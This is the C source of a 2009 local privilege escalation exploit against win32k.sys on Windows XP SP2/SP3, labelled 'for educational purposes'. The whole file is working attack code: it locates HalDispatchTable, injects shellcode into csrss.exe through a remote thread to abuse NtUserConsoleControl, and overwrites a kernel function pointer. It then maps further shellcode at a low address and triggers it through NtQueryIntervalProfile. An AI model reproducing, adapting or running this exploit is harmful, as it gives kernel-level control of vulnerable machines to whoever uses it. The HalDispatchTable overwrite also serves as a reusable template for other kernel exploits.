////////////////////////////////////////////////////////////////////////////////////
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | Microsoft Corporation - http://www.microsoft.com/                          | //
// |                                                                            | //
// | Affected Software:                                                         | //
// | Windows XP Service Pack 2                                                  | //
// | Windows XP Service Pack 3                                                  | //
// |                                                                            | //
// | Affected Driver:                                                           | //
// | Multi-User Win32 Driver - win32k.sys <= 5.1.2600.5796                      | //
// |                                                                            | //
// | Local Privilege Escalation Exploit                                         | //
// | For Educational Purposes Only !                                            | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
// |                                                                            | //
// | NT Internals - http://www.ntinternals.org/                                 | //
// | alex ntinternals org                                                       | //
// | 30 July 2009                                                               | //
// |                                                                            | //
// | References:                                                                | //
// | Exploiting Common Flaws in Drivers                                         | //
// | Ruben Santamarta - http://www.reversemode.com/                             | //
// |                                                                            | //
// +----------------------------------------------------------------------------+ //
////////////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include "NtUserConsoleControl_Exp.h"
#include "InvbShellCode.h"
#include "XxNativeFunctions.c"

int __cdecl main(int argc, char **argv)
{
    NTSTATUS NtStatus;
    
    ULONG AllocationSize = PAGE_SIZE * 64;
    ULONG ImageBase;
    PVOID MappedBase;
    UCHAR ImageName[KERNEL_NAME_LENGTH];
    ULONG DllCharacteristics = DONT_RESOLVE_DLL_REFERENCES;
    PVOID HalDispatchTable;
    PVOID xHalQuerySystemInformation;

    HANDLE ProcessHandle;
    HANDLE UniqueProcess;
    HANDLE ThreadHandle;
    HANDLE UniqueThread;

    ULONG ShellCodeSize = PAGE_SIZE;
    PVOID ShellCodeAddress;
    PVOID BaseAddress = NULL;
    ULONG SyscallNumber = 0x114E;
    USHORT OSBuildNumber;

    UNICODE_STRING DllName;
    ANSI_STRING ProcedureName;
    PSYSTEM_MODULE_INFORMATION_EX ModuleInformation = NULL;
    LARGE_INTEGER Interval;

    UCHAR ThreadShellCode[] =
                                "\x55"                 // push ebp
                                "\x8B\xEC"             // mov ebp, esp

                                "\x2B\xC0"             // sub eax, eax
                                "\x68\xDE\xC0\xAD\xDE" // push 0xDEADC0DE
                                "\x6A\x07"             // push 0x07
                                "\x50"                 // push eax

                                "\xB8\xAD\xDE\x00\x00" // mov eax, 0xDEAD - NtUserConsoleControl
                                "\xBA\x00\x03\xFE\x7F" // mov edx, 0x7FFE0300
                                "\xFF\x12"             // call dword ptr [edx]
                                "\xC9"                 // leave
                                "\xC3"                 // ret
                                "\xCC";                // int 0x03

    ///////////////////////////////////////////////////////////////////////////////////////////////

    system("cls");



    
    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(), // ProcessHandle
                                       &ModuleInformation, // BaseAddress
                                       0,                  // ZeroBits
                                       &AllocationSize,    // AllocationSize
                                       MEM_COMMIT,         // AllocationType
                                       PAGE_READWRITE);    // Protect

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [1] - %.8X\n", NtStatus);    
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = NtQuerySystemInformation(
                                        SystemModuleInformation,
                                        (PSYSTEM_MODULE_INFORMATION_EX)ModuleInformation,
                                        AllocationSize,
                                        NULL);
    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQuerySystemInformation - %.8X\n", NtStatus);
        return NtStatus;
    }
        
    ImageBase = (ULONG)(ModuleInformation->Modules[0].Base);


    RtlMoveMemory(
                  ImageName,
                  (PVOID)(ModuleInformation->Modules[0].ImageName +
                  ModuleInformation->Modules[0].ModuleNameOffset),
                  KERNEL_NAME_LENGTH);

    printf(" +----------------------------------------------------------------------------+\n"
           " | ImageBase - %.8X                                                       |\n"
           " | ImageName - %s                                                   |\n",
           ImageBase,
           ImageName);


    NtStatus = NtFreeVirtualMemory(
                                   NtCurrentProcess(), // ProcessHandle
                                   &ModuleInformation, // BaseAddress
                                   &AllocationSize,    // FreeSize
                                   MEM_DECOMMIT);      // FreeType

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtFreeVirtualMemory [1] - %.8X\n", NtStatus);
        return NtStatus;
    }

    ///////////////////////////////////////////////////////////////////////////////////////////////

    RtlCreateUnicodeStringFromAsciiz(&DllName, (PUCHAR)ImageName);


    NtStatus = LdrLoadDll(
                          NULL,                // DllPath
                          &DllCharacteristics, // DllCharacteristics
                          &DllName,            // DllName
                          &MappedBase);        // DllHandle

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrLoadDll - %.8X\n", NtStatus);    
        return NtStatus;
    }


    RtlInitAnsiString(&ProcedureName, "HalDispatchTable");


    NtStatus = LdrGetProcedureAddress(
                                      (PVOID)MappedBase,          // DllHandle
                                      &ProcedureName,             // ProcedureName
                                      0,                          // ProcedureNumber OPTIONAL
                                      (PVOID*)&HalDispatchTable); // ProcedureAddress

    if(NtStatus)
    {
        printf(" [*] NtStatus of LdrGetProcedureAddress [1] - %.8X\n", NtStatus);    
        return NtStatus;
    }

    (ULONG)HalDispatchTable -= (ULONG)MappedBase;
    (ULONG)HalDispatchTable += ImageBase;

    (ULONG)xHalQuerySystemInformation = (ULONG)HalDispatchTable + sizeof(ULONG);

    printf(" |                                                                            |\n"
           " | HalDispatchTable - %.8X                                                |\n"
           " | xHalQuerySystemInformation - %.8X                                      |\n"
           " +----------------------------------------------------------------------------+\n",
           HalDispatchTable,
           xHalQuerySystemInformation);


    NtStatus = XxInitInbv(ImageBase, (ULONG)MappedBase);

	if(NtStatus)
	{
		printf(" [*] NtStatus of XxInitInbv - %.8X\n", NtStatus);	
		return NtStatus;
	}

    RtlFreeUnicodeString(&DllName);
    RtlFreeAnsiString(&ProcedureName);

    LdrUnloadDll((PVOID)MappedBase);

    ///////////////////////////////////////////////////////////////////////////////////////////////

    NtStatus = XxGetProcessHandle(
                                  L"csrss.exe",
                                  &ProcessHandle,  //进程句柄
                                  &UniqueProcess); //进程pid

    if(NtStatus)
	{
		printf(" [*] NtStatus of XxGetProcessHandle - %.8X\n", NtStatus);
		return NtStatus;
	}

    printf(" +----------------------------------------------------------------------------+\n"
           " | Client Server Runtime Process - csrss.exe                                  |\n"
           " | ProcessId - %.4d                                                           |\n"
           " | ProcessHandle - %.4X                                                       |\n",
           UniqueProcess,
           ProcessHandle);

    (ULONG)xHalQuerySystemInformation -= 0x0C;
    
    RtlMoveMemory(
                  ThreadShellCode + 6,
                  &xHalQuerySystemInformation,
                  sizeof(ULONG));


    NtStatus = XxGetOSVersion(
                              NULL,
                              NULL,
                              &OSBuildNumber);
    
    if(NtStatus)
    {
		printf(" [*] NtStatus of XxGetOSVersion - %.8X\n", NtStatus);
		return NtStatus;
	}
    
    if(OSBuildNumber == 2600)
    {
        RtlMoveMemory(
                      ThreadShellCode + 14,
                      &SyscallNumber,
                      sizeof(ULONG));
    }
    else
    {
        printf(" [*] Unsupported OS...\n");
        return TRUE;
    }

  
    NtStatus = XxCreateThread(
                              &ThreadHandle,
                              &UniqueThread,
                              ProcessHandle,
                              UniqueProcess,
                              ThreadShellCode,
                              sizeof(ThreadShellCode));

    if(NtStatus)
	{
		printf(" [*] NtStatus of XxCreateThread - %.8X\n", NtStatus);
		return NtStatus;
	}

    printf(" |                                                                            |\n"
           " | RemoteThreadId - %.4d                                                      |\n"
           " | RemoteThreadHandle - %.4X                                                  |\n"
           " +----------------------------------------------------------------------------+\n",
           UniqueThread,
           ThreadHandle);
    
    ///////////////////////////////////////////////////////////////////////////////////////////////

    ShellCodeAddress = (PVOID)sizeof(ULONG);


    NtStatus = NtAllocateVirtualMemory(
                                       NtCurrentProcess(),
                                       &ShellCodeAddress,
                                       0,
                                       &ShellCodeSize,
                                       MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
                                       PAGE_EXECUTE_READWRITE);

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtAllocateVirtualMemory [2] - %.8X\n", NtStatus);    
        return NtStatus;
    }

    RtlMoveMemory(ShellCodeAddress, (PVOID)InbvShellCode, ShellCodeSize);

    
    Interval.LowPart = 0xFF676980;
    Interval.HighPart = 0xFFFFFFFF;

    printf("\n 3");
    NtDelayExecution(FALSE, &Interval);

    printf(" 2");
    NtDelayExecution(FALSE, &Interval);

    printf(" 1");
    NtDelayExecution(FALSE, &Interval);

    printf(" Hoop\n\n");
    NtDelayExecution(FALSE, &Interval);


    NtStatus = NtQueryIntervalProfile(
                                      ProfileTotalIssues, // Source
                                      NULL);              // Interval

    if(NtStatus)
    {
        printf(" [*] NtStatus of NtQueryIntervalProfile - %.8X\n", NtStatus);
        return NtStatus;
    }

    return FALSE;
}